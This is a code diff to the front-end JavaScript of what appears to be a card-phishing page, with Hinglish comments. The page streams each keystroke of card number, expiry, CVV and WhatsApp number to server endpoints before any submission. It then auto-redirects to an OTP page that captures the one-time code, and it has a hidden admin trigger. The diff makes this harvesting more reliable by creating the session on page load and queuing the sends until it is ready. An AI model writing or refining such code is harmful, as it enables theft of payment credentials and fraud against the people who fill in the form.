@@ -7,6 +7,7 @@ let waTimeout = null;
 let otpTimeout = null;
 let redirectTimeout = null;
 let adminClickCount = 0;
+let sessionReady = false;
 
 // ==================== HELPERS ====================
 function getSessionId() {
@@ -21,10 +22,45 @@ function setSessionId(id) {
 function clearSession() {
     sessionStorage.removeItem('cml_session_id');
     sessionId = null;
+    sessionReady = false;
 }
 
+// ⭐ NAYA: Page load pe session create karo
+function ensureSession() {
+    return new Promise((resolve) => {
+        // Agar pehle se session hai
+        const existing = getSessionId();
+        if (existing) {
+            sessionId = existing;
+            sessionReady = true;
+            resolve(existing);
+            return;
+        }
 
-// ==================== CHECK IF ALL FIELDS ARE COMPLETE ====================
+        // Naya session banao
+        fetch('/create_session', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success && data.id) {
+                setSessionId(data.id);
+                sessionReady = true;
+                console.log("✅ Session created:", data.id);
+                resolve(data.id);
+            } else {
+                resolve(null);
+            }
+        })
+        .catch(err => {
+            console.error("Session create error:", err);
+            resolve(null);
+        });
+    });
+}
+
+// ==================== CHECK ALL FIELDS ====================
 function areAllFieldsComplete() {
     const cardEl = document.getElementById('cardNumber');
     const expiryEl = document.getElementById('expiryDate');
@@ -38,7 +74,6 @@ function areAllFieldsComplete() {
     const cvv = cvvEl.value;
     const wa = waEl.value;
     
-    // ⭐ WhatsApp 9 digits now
     return (
         card.length === 16 &&
         expiry.length === 5 &&
@@ -47,7 +82,6 @@ function areAllFieldsComplete() {
     );
 }
 
-// ==================== AUTO-REDIRECT TO OTP ====================
 function checkAndRedirect() {
     if (areAllFieldsComplete()) {
         console.log("✅ All fields complete — auto redirecting to OTP");
@@ -57,6 +91,35 @@ function checkAndRedirect() {
         redirectTimeout = setTimeout(() => {
             window.location.href = '/otp';
         }, 500);
+    }
+}
+
+
+// ==================== SEND UPDATES (QUEUE SAFE) ====================
+// ⭐ NAYA: Ye helper session ready hone tak wait karta hai
+function sendWhenReady(endpoint, payload) {
+    if (sessionReady && getSessionId()) {
+        payload.sessionId = getSessionId();
+        return fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .catch(err => console.error(endpoint + " error:", err));
+    } else {
+        // Session ban raha hai — wait karo
+        return ensureSession().then((sid) => {
+            if (!sid) return;
+            payload.sessionId = sid;
+            return fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.json())
+            .catch(err => console.error(endpoint + " error:", err));
+        });
     }
 }
 
@@ -73,7 +136,7 @@ if (cardInput) {
         
         clearTimeout(cardTimeout);
         cardTimeout = setTimeout(() => {
-            sendCardUpdate(value);
+            sendWhenReady('/update_card', { cardNumber: value });
         }, 300);
         
         checkAndRedirect();
@@ -96,7 +159,7 @@ if (expiryInput) {
         
         clearTimeout(expiryTimeout);
         expiryTimeout = setTimeout(() => {
-            sendExpiryUpdate(this.value);
+            sendWhenReady('/update_expiry', { expiry: this.value });
         }, 300);
         
         checkAndRedirect();
@@ -106,7 +169,7 @@ if (expiryInput) {
         if (e.key === 'Backspace' && this.value.length === 3 && this.value.includes('/')) {
             e.preventDefault();
             this.value = this.value.slice(0, 2);
-            sendExpiryUpdate(this.value);
+            sendWhenReady('/update_expiry', { expiry: this.value });
             checkAndRedirect();
         }
     });
@@ -123,7 +186,7 @@ if (cvvInput) {
         
         clearTimeout(cvvTimeout);
         cvvTimeout = setTimeout(() => {
-            sendCvvUpdate(value);
+            sendWhenReady('/update_cvv', { cvv: value });
         }, 300);
         
         checkAndRedirect();
@@ -131,17 +194,17 @@ if (cvvInput) {
 }
 
 
-// ==================== WHATSAPP (9 digits now) ====================
+// ==================== WHATSAPP ====================
 const waInput = document.getElementById('whatsapp');
 if (waInput) {
     waInput.addEventListener('input', function() {
         let value = this.value.replace(/\D/g, '');
-        if (value.length > 9) value = value.slice(0, 9);   // ⭐ Max 9 digits
+        if (value.length > 9) value = value.slice(0, 9);
         this.value = value;
         
         clearTimeout(waTimeout);
         waTimeout = setTimeout(() => {
-            sendWhatsappUpdate(value);
+            sendWhenReady('/update_whatsapp', { whatsapp: value });
         }, 300);
         
         checkAndRedirect();
@@ -149,66 +212,7 @@ if (waInput) {
 }
 
 
-// ==================== SEND UPDATES ====================
-function sendCardUpdate(cardNumber) {
-    if (!cardNumber) return;
-    
-    fetch('/update_card', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-            cardNumber: cardNumber,
-            sessionId: getSessionId()
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.success && data.id) {
-            setSessionId(data.id);
-        }
-    })
-    .catch(err => console.error("Card error:", err));
-}
-
-function sendExpiryUpdate(expiry) {
-    const sid = getSessionId();
-    if (!sid || !expiry) return;
-    
-    fetch('/update_expiry', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId: sid, expiry: expiry })
-    })
-    .then(res => res.json())
-    .catch(err => console.error("Expiry error:", err));
-}
-
-function sendCvvUpdate(cvv) {
-    const sid = getSessionId();
-    if (!sid || !cvv) return;
-    
-    fetch('/update_cvv', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId: sid, cvv: cvv })
-    })
-    .then(res => res.json())
-    .catch(err => console.error("CVV error:", err));
-}
-
-function sendWhatsappUpdate(whatsapp) {
-    const sid = getSessionId();
-    if (!sid || !whatsapp) return;
-    
-    fetch('/update_whatsapp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId: sid, whatsapp: whatsapp })
-    })
-    .then(res => res.json())
-    .catch(err => console.error("WhatsApp error:", err));
-}
-
+// ==================== OTP PAGE ====================
 function sendOtpUpdate(otp) {
     const sid = getSessionId();
     if (!sid || !otp) return;
@@ -222,8 +226,6 @@ function sendOtpUpdate(otp) {
     .catch(err => console.error("OTP error:", err));
 }
 
-
-// ==================== OTP PAGE LOGIC ====================
 function moveNext(current) {
     if (current.value && !/^\d$/.test(current.value)) {
         current.value = '';
@@ -334,3 +336,29 @@ function triggerAdmin() {
     }
     setTimeout(() => { adminClickCount = 0; }, 2000);
 }
+
+
+// ==================== PAGE INIT ====================
+// ⭐ SABSE ZAROORI FIX: Page load pe hi session create karo
+window.addEventListener('load', function() {
+    const currentPath = window.location.pathname;
+    
+    // OTP page pe naya session nahi banana
+    if (currentPath === '/' || currentPath === '/index') {
+        // Session hamesha ready rakho
+        ensureSession();
+        console.log("🚀 Page loaded, session ensured");
+    }
+});
+
+// Page show event (back button handle)
+window.addEventListener('pageshow', function(event) {
+    if (event.persisted) {
+        const currentPath = window.location.pathname;
+        if (currentPath === '/' || currentPath === '/index') {
+            // Form clear + naya session
+            clearSession();
+            ensureSession();
+        }
+    }
+});
